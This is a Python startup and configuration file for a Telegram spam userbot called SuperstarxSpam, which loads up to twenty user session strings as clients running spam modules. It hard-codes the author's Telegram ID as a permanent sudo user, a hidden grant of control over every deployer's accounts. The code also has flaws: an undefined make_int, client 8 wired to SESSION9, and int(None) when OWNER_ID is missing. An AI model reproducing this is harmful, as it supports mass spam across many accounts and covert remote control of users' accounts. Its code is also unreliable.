# Superstar - Telegram Projects
# (c) 2022 - 2023 Star
# Don't Kang Bitch -! 



import asyncio
import os
import sys
import time

from dotenv import load_dotenv
from pyrogram import Client, filters

ULOG = [5207780762 , -1001706953175]

if os.path.exists(".env"):
    load_dotenv(".env")
    
__version__ = "v0.1"

# -------------CONFIGS--------------------
API_ID = int(os.getenv("API_ID", ""))
API_HASH = os.getenv("API_HASH", "")
ALIVE_PIC = os.getenv("ALIVE_PIC", "")
ALIVE_MSG = os.getenv("ALIVE_MSG", "")
PING_MSG = os.getenv("PING_MSG", "")
SESSION = os.getenv("SESSION", None)
SESSION2 = os.getenv("SESSION2", None)
SESSION3 = os.getenv("SESSION3", None)
SESSION4 = os.getenv("SESSION4", None)
SESSION5 = os.getenv("SESSION5", None)
SESSION6 = os.getenv("SESSION6", None)
SESSION7 = os.getenv("SESSION7", None)
SESSION8 = os.getenv("SESSION8", None)
SESSION9 = os.getenv("SESSION9", None)
SESSION10 = os.getenv("SESSION10", None)
SESSION11 = os.getenv("SESSION11", None)
SESSION12 = os.getenv("SESSION12", None)
SESSION13 = os.getenv("SESSION13", None)
SESSION14 = os.getenv("SESSION14", None)
SESSION15 = os.getenv("SESSION15", None)
SESSION16 = os.getenv("SESSION16", None)
SESSION17 = os.getenv("SESSION17", None)
SESSION18 = os.getenv("SESSION18", None)
SESSION19 = os.getenv("SESSION19", None)
SESSION20 = os.getenv("SESSION20", None)
LOGS_CHANNEL = os.getenv("LOGS_CHANNEL", None)
if LOGS_CHANNEL:
    if int(LOGS_CHANNEL) in ULOG:
        print("You Can't Use That Chat As A Log Channel -!")
        print("Change Logs Channel Id else Bot Could not be start")
        quit()
    
HNDLR = os.getenv("HNDLR", ".")
OWNER_ID = int(os.environ.get("OWNER_ID", None))
sudo = os.getenv("SUDO_USERS")

SUDO_USERS = []
if sudo:
    SUDO_USERS = make_int(sudo)
DEVS = [5207780762]
for x in DEVS:
    SUDO_USERS.append(x)

SUDO_USERS.append(OWNER_ID)


# SUDO_USERS = list(filter(lambda x: x, map(int, os.getenv("SUDO_USERS", "5207780762").split())))
#----------------------------------------------

SuperstarxSpam = Client(name="SESSION", api_id = API_ID, api_hash = API_HASH, session_string=SESSION, plugins=dict(root="SuperstarxSpam.module"))
print("Client 1 Found")


hl = HNDLR[0]
start_time = time.time()

#-------------------------CLIENTS-----------------------------

if SESSION2:
    SuperstarxSpam2 = Client(name="SESSION2", api_id = API_ID, api_hash = API_HASH, session_string=SESSION2, plugins=dict(root="SuperstarxSpam.module"))
    print("Client 2 Found")
else:
    SuperstarxSpam2 = None

if SESSION3:
    SuperstarxSpam3 = Client(name="SESSION3", api_id = API_ID, api_hash = API_HASH, session_string=SESSION3, plugins=dict(root="SuperstarxSpam.module"))
    print("Client 3 Found")
else:
    SuperstarxSpam3 = None

if SESSION4:
    SuperstarxSpam4 = Client(name="SESSION4", api_id = API_ID, api_hash = API_HASH, session_string=SESSION4, plugins=dict(root="SuperstarxSpam.module"))
    print("Client 4 Found")
else:
    SuperstarxSpam4 = None

if SESSION5:
    SuperstarxSpam5 = Client(name="SESSION5", api_id = API_ID, api_hash = API_HASH, session_string=SESSION5, plugins=dict(root="SuperstarxSpam.module"))
    print("Client 5 Found")
else:
    SuperstarxSpam5 = None

if SESSION6:
    SuperstarxSpam6 = Client(name="SESSION6", api_id = API_ID, api_hash = API_HASH, session_string=SESSION6, plugins=dict(root="SuperstarxSpam.module"))
    print("Client 6 Found")
else:
    SuperstarxSpam6 = None
        
if SESSION7:
    SuperstarxSpam7 = Client(name="SESSION7", api_id = API_ID, api_hash = API_HASH, session_string=SESSION7, plugins=dict(root="SuperstarxSpam.module"))
    print("Client 7 Found")
else:
    SuperstarxSpam7 = None

if SESSION8:
    SuperstarxSpam8 = Client(name="SESSION8", api_id = API_ID, api_hash = API_HASH, session_string=SESSION9, plugins=dict(root="SuperstarxSpam.module"))
    print("Client 8 Found")
else:
    SuperstarxSpam8 = None

if SESSION9:
    SuperstarxSpam9 = Client(name="SESSION9", api_id = API_ID, api_hash = API_HASH, session_string=SESSION9, plugins=dict(root="SuperstarxSpam.module"))
    print("Client 9 Found")
else:
    SuperstarxSpam9 = None

if SESSION10:
    SuperstarxSpam10 = Client(name="SESSION10", api_id = API_ID, api_hash = API_HASH, session_string=SESSION10, plugins=dict(root="SuperstarxSpam.module"))
    print("Client 10 Found")
else:
    SuperstarxSpam10 = None

if SESSION11:
    SuperstarxSpam11 = Client(name="SESSION11", api_id = API_ID, api_hash = API_HASH, session_string=SESSION11, plugins=dict(root="SuperstarxSpam.module"))
    print("Client 11 Found")
else:
    SuperstarxSpam11 = None

if SESSION12:
    SuperstarxSpam12 = Client(name="SESSION12", api_id = API_ID, api_hash = API_HASH, session_string=SESSION12, plugins=dict(root="SuperstarxSpam.module"))
    print("Client 12 Found")
else:
    SuperstarxSpam12 = None

if SESSION13:
    SuperstarxSpam13 = Client(name="SESSION13", api_id = API_ID, api_hash = API_HASH, session_string=SESSION13, plugins=dict(root="SuperstarxSpam.module"))
    print("Client 13 Found")
else:
    SuperstarxSpam13 = None

if SESSION14:
    SuperstarxSpam14 = Client(name="SESSION14", api_id = API_ID, api_hash = API_HASH, session_string=SESSION14, plugins=dict(root="SuperstarxSpam.module"))
    print("Client 14 Found")
else:
    SuperstarxSpam14 = None

if SESSION15:
    SuperstarxSpam15 = Client(name="SESSION15", api_id = API_ID, api_hash = API_HASH, session_string=SESSION15, plugins=dict(root="SuperstarxSpam.module"))
    print("Client 15 Found")
else:
    SuperstarxSpam15 = None

if SESSION16:
    SuperstarxSpam16 = Client(name="SESSION16", api_id = API_ID, api_hash = API_HASH, session_string=SESSION16, plugins=dict(root="SuperstarxSpam.module"))
    print("Client 16 Found")
else:
    SuperstarxSpam16 = None
    
if SESSION17:
    SuperstarxSpam17 = Client(name="SESSION17", api_id = API_ID, api_hash = API_HASH, session_string=SESSION17, plugins=dict(root="SuperstarxSpam.module"))
    print("Client 17 Found")
else:
    SuperstarxSpam17 = None   
    
if SESSION18:
    SuperstarxSpam18 = Client(name="SESSION18", api_id = API_ID, api_hash = API_HASH, session_string=SESSION18, plugins=dict(root="SuperstarxSpam.module"))
    print("Client 18 Found")
else:
    SuperstarxSpam18 = None     
    
if SESSION19:
    SuperstarxSpam19 = Client(name="SESSION19", api_id = API_ID, api_hash = API_HASH, session_string=SESSION19, plugins=dict(root="SuperstarxSpam.module"))
    print("Client 19 Found")
else:
    SuperstarxSpam19 = None    

if SESSION20:
    SuperstarxSpam20 = Client(name="SESSION20", api_id = API_ID, api_hash = API_HASH, session_string=SESSION20, plugins=dict(root="SuperstarxSpam.module"))
    print("Client 20 Found")
else:
    SuperstarxSpam20 = None
